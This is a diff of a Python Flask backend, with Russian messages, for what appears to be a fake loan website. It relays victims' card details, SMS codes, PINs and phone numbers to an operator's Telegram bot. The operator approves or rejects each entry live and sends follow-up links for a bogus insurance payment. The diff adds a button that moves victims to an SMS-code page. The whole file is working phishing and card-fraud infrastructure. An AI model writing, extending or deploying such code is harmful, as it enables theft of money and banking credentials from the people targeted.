@@ -55,17 +55,10 @@ def get_keyboard(session_id):
         ]
     }
 
-# ========== ОБРАБОТКА КНОПОК (ВЕБХУК) ==========
+# ========== ОБРАБОТКА КНОПОК ==========
 def send_callback_answer(callback_id, text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
     requests.post(url, json={"callback_query_id": callback_id, "text": text})
-
-def edit_message_text(chat_id, message_id, new_text, keyboard=None):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
-    data = {"chat_id": chat_id, "message_id": message_id, "text": new_text, "parse_mode": "HTML"}
-    if keyboard:
-        data["reply_markup"] = keyboard
-    requests.post(url, json=data)
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
@@ -73,26 +66,24 @@ def webhook():
     if 'callback_query' in data:
         callback = data['callback_query']
         callback_id = callback['id']
-        chat_id = callback['message']['chat']['id']
-        message_id = callback['message']['message_id']
         callback_data = callback['data']
         
         if callback_data.startswith('auth:'):
             session_id = callback_data.split(':')[1]
             link = f"{SITE_URL}/page_82554/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на авторизацию")
-            edit_message_text(chat_id, message_id, f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
+            send_to_admin(f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.")
             
         elif callback_data.startswith('payment:'):
             session_id = callback_data.split(':')[1]
             link = f"{SITE_URL}/page_63860/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на оплату")
-            edit_message_text(chat_id, message_id, f"💳 <b>Ссылка на оплату</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
+            send_to_admin(f"💳 <b>Ссылка на оплату</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.")
             
         elif callback_data.startswith('reject:'):
             session_id = callback_data.split(':')[1]
             send_callback_answer(callback_id, "❌ Заявка отклонена")
-            edit_message_text(chat_id, message_id, f"❌ <b>ЗАЯВКА ОТКЛОНЕНА</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"❌ <b>ЗАЯВКА ОТКЛОНЕНА</b>\n\nСессия: {session_id}")
             
             conn = sqlite3.connect('applications.db')
             c = conn.cursor()
@@ -100,7 +91,7 @@ def webhook():
             conn.commit()
             conn.close()
             
-        # ========== КАРТА (первый шаг) ==========
+        # ========== КАРТА ==========
         elif callback_data.startswith('card_ok:'):
             session_id = callback_data.split(':')[1]
             conn = sqlite3.connect('applications.db')
@@ -109,7 +100,7 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "✅ Данные карты подтверждены")
-            edit_message_text(chat_id, message_id, f"✅ <b>ДАННЫЕ КАРТЫ ПОДТВЕРЖДЕНЫ</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"✅ <b>ДАННЫЕ КАРТЫ ПОДТВЕРЖДЕНЫ</b>\n\nСессия: {session_id}")
             
         elif callback_data.startswith('card_error:'):
             session_id = callback_data.split(':')[1]
@@ -119,9 +110,8 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "❌ Данные карты отклонены")
-            edit_message_text(chat_id, message_id, f"❌ <b>ДАННЫЕ КАРТЫ ОТКЛОНЕНЫ</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"❌ <b>ДАННЫЕ КАРТЫ ОТКЛОНЕНЫ</b>\n\nСессия: {session_id}")
             
-        # ========== КАРТА (второй шаг - код) ==========
         elif callback_data.startswith('code_ok:'):
             session_id = callback_data.split(':')[1]
             conn = sqlite3.connect('applications.db')
@@ -130,9 +120,9 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "✅ Код подтверждён")
-            edit_message_text(chat_id, message_id, f"✅ <b>КОД ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}\n💰 100 BYN заморожены", None)
+            send_to_admin(f"✅ <b>КОД ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}\n💰 100 BYN заморожены")
             
-            # Отправляем новое сообщение с кнопкой на страховку
+            # Кнопка на страховку
             insurance_link = f"{SITE_URL}/page_insurance/?session={session_id}"
             insurance_keyboard = {
                 "inline_keyboard": [
@@ -149,7 +139,7 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "❌ Код отклонён")
-            edit_message_text(chat_id, message_id, f"❌ <b>КОД ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"❌ <b>КОД ОТКЛОНЁН</b>\n\nСессия: {session_id}")
             
         elif callback_data.startswith('code_insufficient:'):
             session_id = callback_data.split(':')[1]
@@ -159,16 +149,15 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "💰 Клиенту показано сообщение о недостатке средств")
-            edit_message_text(chat_id, message_id, f"💰 <b>НЕДОСТАТОЧНО СРЕДСТВ</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"💰 <b>НЕДОСТАТОЧНО СРЕДСТВ</b>\n\nСессия: {session_id}")
             
-        # ========== КНОПКА НА СТРАХОВКУ ==========
+        # ========== СТРАХОВКА ==========
         elif callback_data.startswith('insurance_link:'):
             session_id = callback_data.split(':')[1]
             insurance_link = f"{SITE_URL}/oplata_strahovki/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на страховку")
-            edit_message_text(chat_id, message_id, f"🛡️ <b>ССЫЛКА НА ОПЛАТУ СТРАХОВКИ</b>\n\n{insurance_link}\n\nОтправьте эту ссылку клиенту.", None)
+            send_to_admin(f"🛡️ <b>ССЫЛКА НА ОПЛАТУ СТРАХОВКИ</b>\n\n{insurance_link}\n\nОтправьте эту ссылку клиенту.")
             
-        # ========== СТРАХОВКА (оплата) ==========
         elif callback_data.startswith('insurance_card_ok:'):
             session_id = callback_data.split(':')[1]
             conn = sqlite3.connect('applications.db')
@@ -177,7 +166,7 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "✅ Данные карты подтверждены")
-            edit_message_text(chat_id, message_id, f"✅ <b>ДАННЫЕ КАРТЫ (СТРАХОВКА) ПОДТВЕРЖДЕНЫ</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"✅ <b>ДАННЫЕ КАРТЫ (СТРАХОВКА) ПОДТВЕРЖДЕНЫ</b>\n\nСессия: {session_id}")
             
         elif callback_data.startswith('insurance_card_error:'):
             session_id = callback_data.split(':')[1]
@@ -187,7 +176,7 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "❌ Данные карты отклонены")
-            edit_message_text(chat_id, message_id, f"❌ <b>ДАННЫЕ КАРТЫ (СТРАХОВКА) ОТКЛОНЕНЫ</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"❌ <b>ДАННЫЕ КАРТЫ (СТРАХОВКА) ОТКЛОНЕНЫ</b>\n\nСессия: {session_id}")
             
         elif callback_data.startswith('insurance_code_ok:'):
             session_id = callback_data.split(':')[1]
@@ -197,7 +186,7 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "✅ Код подтверждён")
-            edit_message_text(chat_id, message_id, f"✅ <b>КОД (СТРАХОВКА) ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}\n🛡️ Страховка оплачена! Кредит оформлен.", None)
+            send_to_admin(f"✅ <b>КОД (СТРАХОВКА) ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}\n🛡️ Страховка оплачена! Кредит оформлен.")
             
         elif callback_data.startswith('insurance_code_error:'):
             session_id = callback_data.split(':')[1]
@@ -207,7 +196,7 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "❌ Код отклонён")
-            edit_message_text(chat_id, message_id, f"❌ <b>КОД (СТРАХОВКА) ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"❌ <b>КОД (СТРАХОВКА) ОТКЛОНЁН</b>\n\nСессия: {session_id}")
             
         # ========== АВТОРИЗАЦИЯ ==========
         elif callback_data.startswith('auth_code_ok:'):
@@ -218,7 +207,7 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "✅ Код подтверждён")
-            edit_message_text(chat_id, message_id, f"✅ <b>КОД ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"✅ <b>КОД ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}")
             
         elif callback_data.startswith('auth_code_error:'):
             session_id = callback_data.split(':')[1]
@@ -228,7 +217,7 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "❌ Код отклонён")
-            edit_message_text(chat_id, message_id, f"❌ <b>КОД ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"❌ <b>КОД ОТКЛОНЁН</b>\n\nСессия: {session_id}")
             
         elif callback_data.startswith('auth_pin_ok:'):
             session_id = callback_data.split(':')[1]
@@ -238,7 +227,7 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "✅ PIN подтверждён")
-            edit_message_text(chat_id, message_id, f"✅ <b>PIN ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"✅ <b>PIN ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}")
             
         elif callback_data.startswith('auth_pin_error:'):
             session_id = callback_data.split(':')[1]
@@ -248,7 +237,13 @@ def webhook():
             conn.commit()
             conn.close()
             send_callback_answer(callback_id, "❌ PIN отклонён")
-            edit_message_text(chat_id, message_id, f"❌ <b>PIN ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
+            send_to_admin(f"❌ <b>PIN ОТКЛОНЁН</b>\n\nСессия: {session_id}")
+            
+        elif callback_data.startswith('send_sms_link:'):
+            session_id = callback_data.split(':')[1]
+            sms_link = f"{SITE_URL}/page_82554/?session={session_id}&step=sms"
+            send_callback_answer(callback_id, "✅ Ссылка на SMS")
+            send_to_admin(f"📱 <b>ССЫЛКА НА ВВОД SMS</b>\n\n{sms_link}\n\nОтправьте эту ссылку клиенту.")
     
     return jsonify({"status": "ok"})
 
@@ -292,7 +287,7 @@ def get_application(session_id):
         return jsonify({"fullname": row[0], "phone": row[1], "amount": row[2], "term": row[3]})
     return jsonify({"error": "not found"}), 404
 
-# ========== ОПЛАТА (ОСНОВНАЯ) ==========
+# ========== КАРТА ==========
 @app.route('/submit_card', methods=['POST'])
 def submit_card():
     data = request.json
@@ -483,6 +478,47 @@ def submit_auth_phone():
     send_to_admin(f"📱 <b>ЗАПРОС АВТОРИЗАЦИИ (телефон)</b>\n\n🆔 Сессия: {session_id}\n📞 Телефон: {phone}")
     return jsonify({"status": "ok"})
 
+@app.route('/submit_auth_pin', methods=['POST'])
+def submit_auth_pin():
+    data = request.json
+    session_id = data['session_id']
+    pin = data['pin']
+    
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
+    row = c.fetchone()
+    phone = row[0] if row else '—'
+    conn.close()
+    
+    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ PIN (авторизация)</b>
+
+🆔 Сессия: {session_id}
+📞 Телефон: {phone}
+🔢 Введённый PIN: <code>{pin}</code>"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ PIN верный", "callback_data": f"auth_pin_ok:{session_id}"}],
+            [{"text": "❌ PIN не верный", "callback_data": f"auth_pin_error:{session_id}"}],
+            [{"text": "📱 Перевести на SMS", "callback_data": f"send_sms_link:{session_id}"}]
+        ]
+    }
+    
+    send_to_admin(msg, keyboard)
+    return jsonify({"status": "ok"})
+
+@app.route('/check_auth_pin_status/<session_id>', methods=['GET'])
+def check_auth_pin_status(session_id):
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT pin_status FROM auth_sessions WHERE session_id = ?', (session_id,))
+    row = c.fetchone()
+    conn.close()
+    if row:
+        return jsonify({"status": row[0]})
+    return jsonify({"status": "pending"})
+
 @app.route('/submit_auth_code', methods=['POST'])
 def submit_auth_code():
     data = request.json
@@ -522,120 +558,6 @@ def check_auth_code_status(session_id):
     if row:
         return jsonify({"status": row[0]})
     return jsonify({"status": "pending"})
-
-@app.route('/submit_auth_pin', methods=['POST'])
-def submit_auth_pin():
-    data = request.json
-    session_id = data['session_id']
-    pin = data['pin']
-    
-    conn = sqlite3.connect('applications.db')
-    c = conn.cursor()
-    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
-    row = c.fetchone()
-    phone = row[0] if row else '—'
-    conn.close()
-    
-    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ PIN (авторизация)</b>
-
-🆔 Сессия: {session_id}
-📞 Телефон: {phone}
-🔢 Введённый PIN: <code>{pin}</code>"""
-    
-    keyboard = {
-        "inline_keyboard": [
-            [{"text": "✅ PIN верный", "callback_data": f"auth_pin_ok:{session_id}"}],
-            [{"text": "❌ PIN не верный", "callback_data": f"auth_pin_error:{session_id}"}]
-        ]
-    }
-    
-    send_to_admin(msg, keyboard)
-    return jsonify({"status": "ok"})
-
-@app.route('/check_auth_pin_status/<session_id>', methods=['GET'])
-def check_auth_pin_status(session_id):
-    conn = sqlite3.connect('applications.db')
-    c = conn.cursor()
-    c.execute('SELECT pin_status FROM auth_sessions WHERE session_id = ?', (session_id,))
-    row = c.fetchone()
-    conn.close()
-    if row:
-        return jsonify({"status": row[0]})
-    return jsonify({"status": "pending"})
-
-# ========== СТАРЫЕ ЭНДПОИНТЫ (для совместимости) ==========
-@app.route('/submit_phone', methods=['POST'])
-def submit_phone():
-    data = request.json
-    session_id = data['session_id']
-    phone = data['phone']
-    
-    conn = sqlite3.connect('applications.db')
-    c = conn.cursor()
-    c.execute('INSERT OR REPLACE INTO auth_sessions (session_id, phone) VALUES (?, ?)', (session_id, phone))
-    conn.commit()
-    conn.close()
-    
-    send_to_admin(f"📱 <b>ЗАПРОС АВТОРИЗАЦИИ</b>\n\nСессия: {session_id}\n📞 {phone}")
-    return jsonify({"status": "ok"})
-
-@app.route('/submit_code', methods=['POST'])
-def submit_code():
-    data = request.json
-    session_id = data['session_id']
-    code = data['code']
-    
-    conn = sqlite3.connect('applications.db')
-    c = conn.cursor()
-    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
-    row = c.fetchone()
-    phone = row[0] if row else '—'
-    conn.close()
-    
-    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ КОДА</b>
-
-🆔 Сессия: {session_id}
-📞 Телефон: {phone}
-🔢 Введённый код: <code>{code}</code>"""
-    
-    keyboard = {
-        "inline_keyboard": [
-            [{"text": "✅ Код верный", "callback_data": f"auth_code_ok:{session_id}"}],
-            [{"text": "❌ Код не верный", "callback_data": f"auth_code_error:{session_id}"}]
-        ]
-    }
-    
-    send_to_admin(msg, keyboard)
-    return jsonify({"status": "ok"})
-
-@app.route('/submit_pin', methods=['POST'])
-def submit_pin():
-    data = request.json
-    session_id = data['session_id']
-    pin = data['pin']
-    
-    conn = sqlite3.connect('applications.db')
-    c = conn.cursor()
-    c.execute('SELECT phone FROM auth_sessions WHERE session_id = ?', (session_id,))
-    row = c.fetchone()
-    phone = row[0] if row else '—'
-    conn.close()
-    
-    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ PIN</b>
-
-🆔 Сессия: {session_id}
-📞 Телефон: {phone}
-🔢 Введённый PIN: <code>{pin}</code>"""
-    
-    keyboard = {
-        "inline_keyboard": [
-            [{"text": "✅ PIN верный", "callback_data": f"auth_pin_ok:{session_id}"}],
-            [{"text": "❌ PIN не верный", "callback_data": f"auth_pin_error:{session_id}"}]
-        ]
-    }
-    
-    send_to_admin(msg, keyboard)
-    return jsonify({"status": "ok"})
 
 @app.route('/')
 def home():
